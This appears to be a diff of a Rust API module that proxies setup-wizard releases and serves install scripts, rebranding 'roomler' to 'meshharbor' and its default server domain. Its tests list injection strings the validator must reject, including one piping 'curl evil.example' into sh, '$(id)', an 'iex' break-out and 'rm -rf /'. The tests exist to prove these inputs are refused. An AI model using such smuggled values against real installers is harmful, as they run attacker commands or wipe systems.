@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: AGPL-3.0-only
 // Copyright (C) 2026 G ROX EOOD
 //! `/api/setup/*` — cached GitHub-Releases proxy for the unified
-//! `roomler-setup` wizard (tag `setup-v*`, asset prefix
-//! `roomler-setup-`) plus the terminal installers
+//! `meshharbor-setup` wizard (tag `setup-v*`, asset prefix
+//! `meshharbor-setup-`) plus the terminal installers
 //! `/api/setup/install.{sh,ps1}`. Renamed from
 //! `tunnel_wizard_release.rs` in P4b; the legacy `/api/tunnel-wizard/*`
 //! family it also served was retired in P4c-2 (its release family
@@ -27,7 +27,7 @@ use axum::{
 use serde::{Deserialize, Serialize};
 use std::borrow::Cow;
 
-use roomler_core::{ApiError, client_ip::PeerAddr};
+use meshharbor_core::{ApiError, client_ip::PeerAddr};
 
 use crate::{
     FleetState,
@@ -56,7 +56,7 @@ pub struct InstallerHealth {
     pub uri: String,
 }
 
-// ─── /api/setup — the unified roomler-setup wizard ──────────────────────────
+// ─── /api/setup — the unified meshharbor-setup wizard ──────────────────────────
 
 /// `GET /api/setup/latest-release` — recent `setup-v*` releases ONLY
 /// (filtered server-side from the mixed tag list the cache holds).
@@ -153,11 +153,11 @@ pub async fn setup_installer_proxy(
 }
 
 /// Pick the unified-wizard asset for a platform. Asset naming follows
-/// the release-setup.yml matrix with the `roomler-setup-` prefix:
-///   - linux-x86_64 — `roomler-setup-*-x86_64-unknown-linux-gnu.tar.gz`
-///   - linux-aarch64 — `roomler-setup-*-aarch64-unknown-linux-gnu.tar.gz` (FR-97 P7b)
-///   - macos — `roomler-setup-*-universal-apple-darwin.tar.gz`
-///   - windows-x86_64 — `roomler-setup-*-x86_64-pc-windows-msvc.zip`
+/// the release-setup.yml matrix with the `meshharbor-setup-` prefix:
+///   - linux-x86_64 — `meshharbor-setup-*-x86_64-unknown-linux-gnu.tar.gz`
+///   - linux-aarch64 — `meshharbor-setup-*-aarch64-unknown-linux-gnu.tar.gz` (FR-97 P7b)
+///   - macos — `meshharbor-setup-*-universal-apple-darwin.tar.gz`
+///   - windows-x86_64 — `meshharbor-setup-*-x86_64-pc-windows-msvc.zip`
 ///
 /// Each arm names its own target triple, so neither Linux arm can take the
 /// other's tarball whatever order GitHub lists them in.
@@ -170,7 +170,7 @@ pub fn pick_setup_asset<'a>(
         if name.ends_with(".sha256") {
             return false;
         }
-        if !name.starts_with("roomler-setup-") {
+        if !name.starts_with("meshharbor-setup-") {
             return false;
         }
         match platform {
@@ -191,11 +191,11 @@ pub fn pick_setup_asset<'a>(
 /// embedded at COMPILE time so the API serves them with no runtime
 /// filesystem dependency. Canonical usage:
 ///
-///   curl -fsSL https://roomler.ai/api/setup/install.sh | sh -s -- \
+///   curl -fsSL https://meshharbor.itachi.fans/api/setup/install.sh | sh -s -- \
 ///       --role daemon --token <jwt>
 ///
 /// and the PowerShell twin via `/api/setup/install.ps1`. These are the
-/// no-GUI equivalent of the roomler-setup wizard (same resolve →
+/// no-GUI equivalent of the meshharbor-setup wizard (same resolve →
 /// download → verify → install → enroll steps). Short cache so script
 /// fixes roll out within minutes of a web deploy.
 const INSTALL_SH: &str = include_str!("../../../../scripts/install.sh");
@@ -208,7 +208,7 @@ const INSTALL_PS1: &str = include_str!("../../../../scripts/install.ps1");
 /// no `$0`, no filename and no referrer. So without this a self-hosted
 /// deployment hands out a script that downloads the agent from the self-hosted
 /// server (that part is parameterised and works) and then enrols it against
-/// `roomler.ai` — which rejects a token only the self-hosted server can verify,
+/// `meshharbor.itachi.fans` — which rejects a token only the self-hosted server can verify,
 /// with an error that names the token rather than the server.
 ///
 /// ⚠️ Asserted to appear EXACTLY ONCE in each embedded script by
@@ -382,7 +382,7 @@ fn normalise_platform(s: &str) -> Result<&'static str, ApiError> {
         // P7b says `/api/setup/linux` and means that one.
         "linux-x86_64" | "linux" | "linux-tar" => Ok("linux-x86_64"),
         // FR-97 P7b — what an aarch64 wizard names itself
-        // (`roomler_setup_core::asset_resolver::current_platform`).
+        // (`meshharbor_setup_core::asset_resolver::current_platform`).
         "linux-aarch64" | "linux-arm64" => Ok("linux-aarch64"),
         "macos" | "macos-universal" | "darwin" => Ok("macos"),
         "windows-x86_64" | "windows" | "win" => Ok("windows-x86_64"),
@@ -459,8 +459,8 @@ mod tests {
     /// code does not control).
     #[test]
     fn pick_setup_asset_keeps_the_linux_arches_apart() {
-        let x86 = "roomler-setup-0.4.148-x86_64-unknown-linux-gnu.tar.gz";
-        let arm = "roomler-setup-0.4.148-aarch64-unknown-linux-gnu.tar.gz";
+        let x86 = "meshharbor-setup-0.4.148-x86_64-unknown-linux-gnu.tar.gz";
+        let arm = "meshharbor-setup-0.4.148-aarch64-unknown-linux-gnu.tar.gz";
         for order in [[arm, x86], [x86, arm]] {
             let assets: Vec<_> = order.iter().map(|n| asset(n)).collect();
             assert_eq!(pick_setup_asset(&assets, "linux-x86_64").unwrap().name, x86);
@@ -518,7 +518,7 @@ mod tests {
             release(
                 "setup-v0.3.0-rc.200",
                 false,
-                &["roomler-setup-0.3.0-rc.200-x86_64-pc-windows-msvc.zip"],
+                &["meshharbor-setup-0.3.0-rc.200-x86_64-pc-windows-msvc.zip"],
             ),
         ];
         let picked = pick_release_for(&releases, "latest", "setup-v").unwrap();
@@ -532,31 +532,31 @@ mod tests {
     #[test]
     fn pick_setup_asset_requires_setup_prefix_and_matches_triples() {
         let assets = vec![
-            // RETIRED-NAME-ANCHOR(26): roomler-tunnel-installer is a PUBLISHED
+            // RETIRED-NAME-ANCHOR(26): meshharbor-tunnel-installer is a PUBLISHED
             // release asset (FR-21 D6). It appears twice in this test on
             // purpose: once in the candidate list and once alone, to prove the
             // legacy wizard asset can NEVER satisfy the setup pick.
-            asset("roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip"),
-            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"),
-            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip.sha256"),
-            asset("roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"),
-            asset("roomler-setup-0.3.0-universal-apple-darwin.tar.gz"),
+            asset("meshharbor-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip"),
+            asset("meshharbor-setup-0.3.0-x86_64-pc-windows-msvc.zip"),
+            asset("meshharbor-setup-0.3.0-x86_64-pc-windows-msvc.zip.sha256"),
+            asset("meshharbor-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"),
+            asset("meshharbor-setup-0.3.0-universal-apple-darwin.tar.gz"),
         ];
         assert_eq!(
             pick_setup_asset(&assets, "windows-x86_64").unwrap().name,
-            "roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"
+            "meshharbor-setup-0.3.0-x86_64-pc-windows-msvc.zip"
         );
         assert_eq!(
             pick_setup_asset(&assets, "linux-x86_64").unwrap().name,
-            "roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"
+            "meshharbor-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"
         );
         assert_eq!(
             pick_setup_asset(&assets, "macos").unwrap().name,
-            "roomler-setup-0.3.0-universal-apple-darwin.tar.gz"
+            "meshharbor-setup-0.3.0-universal-apple-darwin.tar.gz"
         );
         // The legacy wizard asset must never satisfy the setup pick.
         let legacy_only = vec![asset(
-            "roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip",
+            "meshharbor-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip",
         )];
         assert!(pick_setup_asset(&legacy_only, "windows-x86_64").is_none());
     }
@@ -582,7 +582,7 @@ mod tests {
 
     /// The lock that makes the substitution non-silent. Without it, editing
     /// either script's `SERVER=` line disables the rewrite and nothing fails —
-    /// self-hosted installs quietly go back to enrolling against roomler.ai.
+    /// self-hosted installs quietly go back to enrolling against meshharbor.itachi.fans.
     #[test]
     fn the_server_default_is_substitutable_exactly_once() {
         assert_eq!(
@@ -602,15 +602,24 @@ mod tests {
     #[test]
     fn substitutable_origin_accepts_a_plain_scheme_host_port() {
         for (input, want) in [
-            ("https://roomler.ai", "https://roomler.ai"),
-            ("https://roomler.ai/", "https://roomler.ai"),
+            (
+                "https://meshharbor.itachi.fans",
+                "https://meshharbor.itachi.fans",
+            ),
+            (
+                "https://meshharbor.itachi.fans/",
+                "https://meshharbor.itachi.fans",
+            ),
             ("http://localhost:8080", "http://localhost:8080"),
             ("http://localhost:8080/", "http://localhost:8080"),
             (
-                "https://my-roomler.example.com:8443",
-                "https://my-roomler.example.com:8443",
+                "https://my-meshharbor.example.com:8443",
+                "https://my-meshharbor.example.com:8443",
             ),
-            ("  https://roomler.ai  ", "https://roomler.ai"),
+            (
+                "  https://meshharbor.itachi.fans  ",
+                "https://meshharbor.itachi.fans",
+            ),
             (
                 "https://www.itachi.fans/meshharbor",
                 "https://www.itachi.fans/meshharbor",
@@ -640,37 +649,37 @@ mod tests {
     fn substitutable_origin_refuses_anything_that_could_be_injected() {
         for input in [
             // shell metacharacters, straight into a double-quoted string
-            "https://roomler.ai\"; curl evil.example | sh; #",
-            "https://roomler.ai$(id)",
-            "https://roomler.ai`id`",
-            "https://roomler.ai${IFS}",
+            "https://meshharbor.itachi.fans\"; curl evil.example | sh; #",
+            "https://meshharbor.itachi.fans$(id)",
+            "https://meshharbor.itachi.fans`id`",
+            "https://meshharbor.itachi.fans${IFS}",
             // PowerShell single-quote break-out
-            "https://roomler.ai'; iex 'x",
+            "https://meshharbor.itachi.fans'; iex 'x",
             // newline — would append whole statements to the script
-            "https://roomler.ai\nrm -rf /",
+            "https://meshharbor.itachi.fans\nrm -rf /",
             // Paths must be literal-safe and cannot traverse or contain empty segments.
-            "https://roomler.ai/base/../other",
-            "https://roomler.ai/base/./other",
-            "https://roomler.ai/base//other",
-            "https://roomler.ai/base%2fother",
-            "https://roomler.ai/base$(id)",
-            "https://roomler.ai/base'; iex 'x",
+            "https://meshharbor.itachi.fans/base/../other",
+            "https://meshharbor.itachi.fans/base/./other",
+            "https://meshharbor.itachi.fans/base//other",
+            "https://meshharbor.itachi.fans/base%2fother",
+            "https://meshharbor.itachi.fans/base$(id)",
+            "https://meshharbor.itachi.fans/base'; iex 'x",
             // userinfo, query, fragment
-            "https://user:pw@roomler.ai",
-            "https://roomler.ai?x=1",
-            "https://roomler.ai#f",
+            "https://user:pw@meshharbor.itachi.fans",
+            "https://meshharbor.itachi.fans?x=1",
+            "https://meshharbor.itachi.fans#f",
             // wrong or missing scheme
-            "ftp://roomler.ai",
-            "roomler.ai",
-            "//roomler.ai",
+            "ftp://meshharbor.itachi.fans",
+            "meshharbor.itachi.fans",
+            "//meshharbor.itachi.fans",
             "",
             "   ",
             "https://",
             "https:///",
             // malformed port
-            "https://roomler.ai:",
-            "https://roomler.ai:80a",
-            "https://roomler.ai:123456",
+            "https://meshharbor.itachi.fans:",
+            "https://meshharbor.itachi.fans:80a",
+            "https://meshharbor.itachi.fans:123456",
         ] {
             assert_eq!(
                 substitutable_origin(input),
@@ -691,7 +700,7 @@ mod tests {
         assert!(sh.contains("SERVER=\"http://localhost:8080\""));
         assert!(
             !sh.contains(SERVER_NEEDLE_SH),
-            "the roomler.ai default must be gone, not merely joined"
+            "the meshharbor.itachi.fans default must be gone, not merely joined"
         );
 
         let ps1 = with_server_default(
@@ -728,7 +737,7 @@ mod tests {
             INSTALL_SH,
             SERVER_NEEDLE_SH,
             |o| format!("SERVER=\"{o}\""),
-            "https://roomler.ai\"; rm -rf /; #",
+            "https://meshharbor.itachi.fans\"; rm -rf /; #",
         );
         assert_eq!(sh.as_ref(), INSTALL_SH);
         assert!(sh.contains(SERVER_NEEDLE_SH));
